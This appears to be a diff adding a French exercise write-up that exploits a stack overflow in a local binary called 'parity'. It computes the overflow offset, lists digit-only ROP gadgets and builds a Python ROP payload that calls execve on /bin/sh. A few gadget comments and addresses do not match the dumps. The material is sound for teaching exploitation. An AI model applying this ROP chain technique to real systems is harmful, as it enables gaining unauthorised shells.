@@ -1,0 +1,112 @@
+1. Pour connaitre la taille du buffer à overflow (défini comme char sentence[64]
+   dans le code source), j'ai utilisé la commande `objdump -d parity` pour
+   désassembler le binaire et examiner son fonctionnement.
+
+   804860d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
+   8048610:	89 04 24             	mov    %eax,(%esp)
+   8048613:	e8 08 fe ff ff       	call   8048420 <strcpy@plt>
+
+   L'instruction `lea -0x4c(%ebp),%eax` charge l'adresse du buffer dans %eax,
+   qui sera utilisé en premier argument de strcpy. On peut en déduire que le
+   le buffer commence à l'offset -0x4c (76 en décimal) par rapport à %ebp.
+   Il faudra donc overflow de 76 + 4 pour écrire sur l'adresse de retour de la
+   fonction ciblée.
+
+   Pour trouver les gadgets et les chaines de caractères utilisables :
+
+   objdump -s -d ./parity --start-address=0x30303030 --stop-address=0x39393939
+
+   et pour faire beaucoup plus simple : utiliser msfrop. Soit en faisant 
+   `msfrop -v ./parity` et en triant à la main les gadgets comme il y en a peu,
+   sinon en utilisant `msfrop ./parity -x gadgets.csv` pour exporter les gadgets
+   dans un fichier .csv, pour ensuite facilement les trier pour garder
+   uniquement la plage d'addresse qui nous intéresse pour cet exerice.
+
+2. Liste des gadgets utilisables (adresses composées uniquement de chiffres):
+
+gadget: 0x30303231
+0x30303231:	rol ebx, 89h
+0x30303234:	ret 89c3h
+gadget: 0x30303032
+0x30303032:	add [eax], al
+0x30303034:	add [eax], al
+0x30303036:	ret
+gadget: 0x30303033
+0x30303033:	add [eax], al
+0x30303035:	add bl, al
+0x30303037:	inc eax
+0x30303038:	ret
+gadget: 0x30303130
+0x30303130:	xor eax, eax
+0x30303132:	ret
+gadget: 0x30303133
+0x30303133:	sub eax, 4
+0x30303136:	ret
+gadget: 0x30303135
+0x30303135:	add al, -3dh
+0x30303137:	ret
+gadget: 0x30303230
+0x30303230:	mov ecx, eax
+0x30303232:	ret
+gadget: 0x30303233
+0x30303233:	mov edx, eax
+0x30303235:	ret
+gadget: 0x30303236
+0x30303236:	mov ebx, eax
+0x30303238:	ret
+gadget: 0x30303330
+0x30303330:	pop eax
+0x30303331:	ret
+gadget: 0x30303332
+0x30303332:	mov [eax], ebx
+0x30303334:	ret
+
+et la liste des chaines de caractères utilisables:
+
+ 34323422 00000000 00000000 00003030 30303905  ..........00009.
+ 34323432 00002f62 696e2f73 6800               ../bin/sh.      
+
+ne sont utilisables que les chaines de caractères dont l'adresse ne contient que
+des chiffres encore une fois.
+
+3. Pour réaliser un exploit de type ROP qui lancera /bin/sh, les étapes sont les
+   suivantes:
+   - mettre la valeur de eax à 11
+   - faire pointer ebx sur la chaine de caractères "/bin/sh"
+   - définir ecx et edx à NULL (0x0), car pas besoin d'arguments dans cet
+     exercice.
+   - appeler execve avec `int 0x80`
+
+   Nous avons tous les gadgets nécessaires, il suffit de :
+   - appeler le gadget `pop eax; ret` en placant l'adresse de "/bin/sh" juste
+     après pour qu'eax pointe dessus
+   - mettre cette adresse dans ebx en utilisant le gadget `mov ebx, eax; ret`
+   - définir eax à 0x0 en utilisant le gadget `xor eax, eax; ret` puis utiliser
+     `mov ecx, eax; ret` et `mov edx, eax; ret`
+   - utiliser `inc eax; ret` 11 fois pour avoir le numéro de syscall de execve
+   - appeler `int 0x80`. Cette instruction n'est pas un gadget, mais elle est
+     trouvable dans le code en cherchant le bytecode correspondant: `cd80`. Il
+     n'est pas nécessaire de ne pas retourner après cet appel, car nous serons
+     dans le shell.
+
+4. La ligne de commande permettant d'exploiter le programme est la suivante :
+
+python3 -c 'from os import execve
+from struct import pack
+
+prog = "./parity"
+buf_size= 0x4c
+
+payload = (
+    b"1" * (buf_size + 4) + 
+    pack("<L", 0x30303330) + # pop eax; ret
+    pack("<L", 0x34323434) + # "/bin/sh" string adress
+    pack("<L", 0x30303236) + # mov eax, ebx; ret
+    pack("<L", 0x30303130) + # xor eax, eax; ret
+    pack("<L", 0x30303230) + # mov eax, ecx; ret
+    pack("<L", 0x30303233) + # mov eax, edx; ret
+    pack("<L", 0x30303037) * 11 + # inc eax; ret
+    pack("<L", 0x30303335) # int 0x80
+)
+
+execve(prog, [prog, payload], {})'
